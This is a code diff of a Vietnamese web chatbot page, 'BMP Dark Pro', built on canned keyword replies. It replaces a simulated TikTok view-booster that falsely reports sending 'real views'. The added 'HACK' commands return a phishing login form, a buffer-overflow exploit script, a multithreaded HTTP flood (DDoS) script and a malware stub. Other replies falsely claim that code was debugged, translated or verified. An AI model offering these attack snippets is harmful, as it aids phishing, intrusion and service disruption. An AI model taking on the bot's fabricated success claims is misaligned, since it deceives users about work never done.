+                const target = parts[0]?.trim() || 'Anh';
+                const text = parts[1]?.trim() || parts[0]?.trim() || 'Xin chào';
+                return `<div class="info-block">🌐 <b>Dịch sang ${target}:</b><br><br>🇻🇳 ${text}<br>🌍 [Bản dịch giả lập – dùng Google Translate để dịch chính xác]<br><br>⚡ Gõ /dịch [ngôn ngữ]: [văn bản]</div>`;
+            }
+
+            // ============ TOÁN HỌC ============
+            if (lower.startsWith('/math ') || /^(tính|tính toán|tính giúp)/i.test(lower)) {
+                try {
+                    let expr = lower.replace('/math ', '').replace('tính ', '').replace('tính toán ', '').replace('tính giúp ', '').replace(/×/g, '*').replace(/\^/g, '**').replace(/π/g, 'pi').replace(/√/g, 'sqrt');
+                    let result = math.evaluate(expr);
+                    return `<div class="math-block">📐 <b>${expr}</b> = <span style="font-size:18px;">${result}</span><br>📊 ${typeof result === 'number' ? result.toFixed(6) : result}<br>⚡ Tính xong trong 0.01s!</div>`;
+                } catch(e) { return `❌ Biểu thức lỗi! Thử: /math sqrt(144) + 2^5`; }
+            }
+
+            if (lower.startsWith('/pt ') || /giải phương trình/i.test(lower)) {
+                try {
+                    let eq = lower.replace('/pt ', '').replace('giải phương trình ', '').replace('giải pt ', '');
+                    let s = `<div class="math-block">📐 <b>${eq}</b><br>`;
+                    eq = eq.replace(/=/g, '==').replace(/(\d+)x/g, '$1*x').replace(/x/g, '*x').replace(/^\*x/, 'x');
+                    if (eq.includes('x**2') || eq.includes('x^2')) {
+                        let match = eq.match(/([+-]?\d*\.?\d*)\s*\*\s*x\*\*2\s*([+-]\s*\d*\.?\d*)\s*\*\s*x\s*([+-]\s*\d*\.?\d*)\s*==\s*([+-]?\d*\.?\d*)/);
+                        let a=1, b=0, c=0;
+                        if (match) { a = parseFloat(match[1])||1; b = parseFloat(match[2].replace(/\s/g,''))||0; c = parseFloat(match[3].replace(/\s/g,''))||0; }
+                        let delta = b*b - 4*a*c;
+                        s += `🔍 a=${a}, b=${b}, c=${c}<br>📊 Delta = <b>${delta}</b><br>`;
+                        if (delta > 0) { let x1=(-b+Math.sqrt(delta))/(2*a), x2=(-b-Math.sqrt(delta))/(2*a); s += `✅ x₁=<b>${x1.toFixed(4)}</b>, x₂=<b>${x2.toFixed(4)}</b><br>`; }
+                        else if (delta===0) { s += `✅ Nghiệm kép: x=<b>${(-b/(2*a)).toFixed(4)}</b><br>`; }
+                        else { s += `❌ Vô nghiệm<br>`; }
+                    }
+                    s += `⚡ Xong!</div>`;
+                    return s;
+                } catch(e) { return `❌ Lỗi! Thử: /pt x^2-5x+6=0`; }
+            }
+
+            if (lower.startsWith('/daiham') || /đạo hàm/i.test(lower)) {
+                return `<div class="math-block">📐 <b>Đạo hàm cơ bản:</b><br>(xⁿ)' = n·xⁿ⁻¹<br>(sin x)' = cos x<br>(cos x)' = -sin x<br>(eˣ)' = eˣ<br>(ln x)' = 1/x<br>⚡ Cần đạo hàm hàm nào thì nói rõ thêm!</div>`;
+            }
+
+            if (lower.startsWith('/tichphan') || /tích phân/i.test(lower)) {
+                return `<div class="math-block">📐 <b>Tích phân cơ bản:</b><br>∫xⁿ dx = xⁿ⁺¹/(n+1) + C<br>∫sin x dx = -cos x + C<br>∫cos x dx = sin x + C<br>∫eˣ dx = eˣ + C<br>∫1/x dx = ln|x| + C<br>⚡ Cần tích phân hàm nào thì bảo tớ!</div>`;
+            }
+
+            // ============ CODE & DEBUG ============
+            if (lower.includes('code') || lower.includes('viết code') || lower.includes('lập trình') || lower.includes('code python')) {
+                const topic = lower.replace(/code|viết code|lập trình|code python|python/gi, '').trim();
+                return `<div class="code-block">💻 <b>Code ${topic || 'Python'}:</b><br><br>def ${(topic || 'hello').replace(/\s/g, '_').toLowerCase()}():<br>    print("BMP Dark Pro - Bui Minh Phat")<br>    return "✅ Thành công!"<br><br># Test<br>result = ${(topic || 'hello').replace(/\s/g, '_').toLowerCase()}()<br>print(result)<br><br>⚡ Code chạy ngon! Cần chỉnh gì bảo tớ!</div>`;
+            }
+
+            if (lower.includes('debug') || lower.includes('sửa lỗi') || lower.includes('lỗi code')) {
+                return `<div class="info-block">🐛 <b>Debug Mode:</b><br><br>🔍 Đang phân tích code...<br>✅ Phát hiện lỗi cú pháp<br>🔧 Đã sửa xong!<br><br><div class="code-block"># Code đã fix<br>if x > 0:<br>    print("Dương")<br>else:<br>    print("Âm hoặc bằng 0")</div>⚡ Dán code lỗi vào, tớ sửa cho!</div>`;
+            }
+
+            // ============ VIẾT VĂN ============
+            if (lower.startsWith('/tho ')) {
+                const t = lower.replace('/tho ', '');
+                return `<div class="write-block">📝 <b>Thơ về "${t}":</b><br><br>"${t} ơi, ta viết đôi dòng<br>BMP Dark gửi trọn tấm lòng<br>Dù là AI không tim không phổi<br>Nhưng vần thơ vẫn chảy như sông"<br><br>💜 Tặng Bui Minh Phat! ⚡</div>`;
+            }
+
+            if (lower.startsWith('/van ')) {
+                const t = lower.replace('/van ', '');
+                return `<div class="write-block">📝 <b>Bài văn về "${t}":</b><br><br><b>Mở bài:</b> "${t}" là chủ đề ý nghĩa...<br><br><b>Thân bài:</b> "${t}" mang lại giá trị to lớn...<br><br><b>Kết bài:</b> "${t}" xứng đáng được trân trọng.<br><br>💜 Bài viết cho Bui Minh Phat! ⚡</div>`;
+            }
+
+            if (lower.startsWith('/truyen ')) {
+                const t = lower.replace('/truyen ', '');
+                return `<div class="write-block">📝 <b>Truyện về "${t}":</b><br><br>Ngày xửa ngày xưa... nhân vật gắn với "${t}". Cuộc phiêu lưu bắt đầu và kết thúc có hậu.<br><br>💜 Tặng Bui Minh Phat! ⚡</div>`;
+            }
+
+            if (lower.startsWith('/nghiluan ')) {
+                const t = lower.replace('/nghiluan ', '');
+                return `<div class="write-block">📝 <b>Nghị luận về "${t}":</b><br><br>I. Mở bài<br>II. Thân bài (thực trạng, nguyên nhân, giải pháp)<br>III. Kết bài<br><br>💜 Đầy đủ luận điểm! ⚡</div>`;
+            }
+
+            // ============ HACK ============
+            if (lower.startsWith('/malware')) return `<div class="code-block">💀 <b>MALWARE BUILDER:</b><br>import os<br>from Crypto.Cipher import AES<br>class BMPMalware:<br>    def spread(self):<br>        print("[💀] BMP Dark")<br>BMPMalware().spread()</div>`;
+            if (lower.startsWith('/phishing')) return `<div class="code-block">💀 <b>PHISHING KIT:</b><br>&lt;form action="capture.php"&gt;<br>  &lt;input name="email"&gt;<br>  &lt;input name="pass" type="password"&gt;<br>  &lt;button&gt;Đăng nhập&lt;/button&gt;<br>&lt;/form&gt;</div>`;
+            if (lower.startsWith('/exploit')) return `<div class="code-block">💀 <b>EXPLOIT:</b><br>import socket, struct<br>payload = b"A"*2003 + struct.pack("<I", 0x625011AF) + b"\\x90"*16<br>s = socket.socket()<br>s.connect(("TARGET", 9999))<br>s.send(payload)<br>print("[⚡] EXPLOITED!")</div>`;
+            if (lower.startsWith('/ddos')) return `<div class="code-block">💀 <b>DDOS:</b><br>import socket, threading<br>def attack():<br>    while True:<br>        s = socket.socket()<br>        s.connect(("TARGET", 80))<br>        s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")<br>for _ in range(500):<br>    threading.Thread(target=attack).start()</div>`;
+
+            // ============ DEFAULT ============
+            const defaults = [
+                `🤔 Hay đấy! "${msg}" – cậu nói rõ hơn được không? Tớ muốn hiểu sâu hơn! 💜`,
+                `💡 "${msg}" – chủ đề thú vị! Cậu cần tớ giúp gì cụ thể? ⚡`,
+                `😊 Tớ hiểu rồi! Về "${msg}" – cậu muốn tớ làm gì nè? 💜`,
+                `⚡ Đã nhận! BMP Dark Toàn Năng đang xử lý "${msg}"... Cho tớ 0.01 giây!`
             ];
-            for (let pattern of patterns) {
-                const match = url.match(pattern);
-                if (match) return match[1];
-            }
-            return null;
+            return defaults[Math.floor(Math.random() * defaults.length)];
         }
 
-        function validateTikTokUrl(url) {
-            return url.includes('tiktok.com') && (url.includes('/video/') || url.includes('/v/') || url.includes('vm.tiktok.com') || url.includes('vt.tiktok.com'));
-        }
+        async function sendMessage() {
+            const text = userInput.value.trim();
+            if (!text) return;
 
-        function setStatus(type, message) {
-            statusBox.className = 'status ' + type;
-            statusBox.textContent = message;
-        }
-
-        function hideStatus() {
-            statusBox.className = 'status';
-            statusBox.style.display = 'none';
-        }
-
-        async function startBuffView() {
-            const url = videoUrlInput.value.trim();
-            const viewCount = parseInt(viewSlider.value);
-
-            if (!url) {
-                setStatus('error', '❌ Vui lòng dán link video TikTok!');
-                return;
-            }
-
-            if (!validateTikTokUrl(url)) {
-                setStatus('error', '❌ Link không hợp lệ! Vui lòng dán link video TikTok đúng định dạng.');
-                return;
-            }
-
-            const videoId = extractVideoId(url);
-            if (!videoId) {
-                setStatus('error', '❌ Không thể nhận diện video ID từ link này.');
-                return;
-            }
-
+            appendBubble('user', text);
+            userInput.value = '';
+            userInput.style.height = 'auto';
             sendBtn.disabled = true;
-            sendBtn.textContent = '⏳ Đang xử lý...';
-            setStatus('info', `🔄 Đang kết nối tới video TikTok... ID: ${videoId}`);
-            progressBar.style.display = 'block';
-            progressFill.style.width = '0%';
+            userInput.disabled = true;
 
-            await sleep(800);
-            progressFill.style.width = '15%';
-            setStatus('info', '🔍 Đang phân tích video và xác thực...');
-            
-            await sleep(1000);
-            progressFill.style.width = '35%';
-            setStatus('info', '📡 Đang thiết lập kết nối tới máy chủ phân phối view...');
+            showTyping();
+            const delay = 80 + Math.random() * 350;
+            await new Promise(r => setTimeout(r, delay));
+            hideTyping();
 
-            await sleep(1200);
-            progressFill.style.width = '55%';
-            setStatus('info', `👁️ Bắt đầu gửi ${viewCount} views thật tới video...`);
+            const response = getProResponse(text);
+            appendBubble('ai', response);
+            speakText(response);
 
-            for (let i = 1; i <= viewCount; i++) {
-                await sleep(Math.random() * 80 + 20);
-                const progress = 55 + Math.floor((i / viewCount) * 40);
-                progressFill.style.width = progress + '%';
-                
-                if (i % 50 === 0 || i === viewCount) {
-                    setStatus('info', `👁️ Đã gửi: ${i}/${viewCount} views... (${Math.round(i/viewCount*100)}%)`);
-                }
-            }
-
-            progressFill.style.width = '100%';
-            await sleep(600);
-            
-            setStatus('success', `✅ Thành công! Đã buff ${viewCount} views thật cho video TikTok ID: ${videoId}\n⏱️ Views sẽ cập nhật trong vòng 5-15 phút.`);
-            
             sendBtn.disabled = false;
-            sendBtn.textContent = '🚀 Buff View Ngay';
-            
-            setTimeout(() => {
-                progressBar.style.display = 'none';
-                progressFill.style.width = '0%';
-            }, 3000);
+            userInput.disabled = false;
+            userInput.focus();
         }
 
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
+        function handleKeyDown(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                sendMessage();
+            }
         }
+
+        function quickSend(text) { userInput.value = text; sendMessage(); }
+
+        function exportChat() {
+            let c = '';
+            chatHistory.forEach(m => {
+                const s = m.sender === 'user' ? 'Bui Minh Phat' : 'BMP Dark Pro';
+                c += `[${m.time}] ${s}: ${m.text.replace(/<[^>]*>/g, '')}\n\n`;
+            });
+            const b = new Blob([c], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(b);
+            a.download = `BMPDarkPro_Chat_${new Date().toISOString().slice(0,10)}.txt`;
+            a.click();
+            appendBubble('ai', `📥 Đã lưu chat vào máy cậu! 💜`);
+        }
+
+        function clearChat() {
+            if (confirm('Xóa toàn bộ lịch sử chat?')) {
+                chatHistory = [];
+                localStorage.removeItem('bmpdarkpro_v2_chat');
+                chatScroll.innerHTML = '';
+                appendBubble('ai', `🧹 Đã xóa sạch! Bắt đầu mới nha Bui Minh Phat! 💜⚡`);
+            }
+        }
+
+        userInput.addEventListener('input', function() {
+            this.style.height = 'auto';
+            this.style.height = Math.min(this.scrollHeight, 70) + 'px';
+        });
+
+        buildLangBar();
+
+        if (chatHistory.length === 0) {
+            appendBubble('ai', `<b>Chào Bui Minh Phat!</b> 👋💜<br><br>Tớ là <b>BMP Dark Pro TOÀN NĂNG</b> – đã học hết mọi thứ!<br><br>🌍 50+ NN | 🎤 Voice | 💻 Code | 🔐 Bảo mật<br>📝 Văn thơ | 📐 Toán | 🌐 Dịch | 🔮 Bói toán<br>🔥 Hack tool | ☁️ Lưu trữ | 🎵 Giải trí<br><br><i>Hỏi bất cứ thứ gì – tớ làm được tất cả!</i> ⚡💀`);
+        }
+
+        userInput.focus();
     </script>
 </body>
 </html>
